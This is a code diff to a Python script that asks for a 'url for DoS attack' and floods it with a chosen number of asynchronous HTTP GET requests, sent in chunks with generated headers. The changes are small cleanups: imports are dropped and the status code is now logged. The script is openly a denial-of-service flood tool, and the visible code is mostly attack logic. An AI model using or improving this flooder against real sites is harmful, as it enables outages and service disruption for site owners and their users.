@@ -1,11 +1,9 @@
 import os
 import aiohttp
 import asyncio
-from datetime import time
 from datetime import datetime
 from colorama import Fore
 from utils.headers import initHeaders
-import threading
 
 def clear():
     if os.system('nt'):
@@ -26,8 +24,8 @@ def timewrap(function):
 async def make_request(url: str):
     async with aiohttp.ClientSession() as session:
         try:
-            async with session.get(url, headers=initHeaders(), proxy=None):
-                print(f'{Fore.GREEN}Request for url {url} is completed | {datetime.now().strftime("%H:%M:%S:%f %d-%m-%Y")} {Fore.RESET}')
+            async with session.get(url, headers=initHeaders(), proxy=None) as resp:
+                print(f'{Fore.GREEN}Request for url {url} is completed | Status: {resp.status} | {datetime.now().strftime("%H:%M:%S:%f")} {Fore.RESET}')
         except:
             print(Fore.RED + "Request for url " + url + " is not done" + Fore.RESET)
 
@@ -71,6 +69,5 @@ if __name__ == '__main__':
     url = input("Enter url for DoS attack: ")
     amount_of_requests = int(input("Enter amount of requests: "))
     chunk_size = int(input("Enter size of chunk: "))
-    #thread = threading.Thread(target=start_thread, name=f'thread{t}', args= {url, chunk_size})
     start_thread(url, amount_of_requests, chunk_size)
 
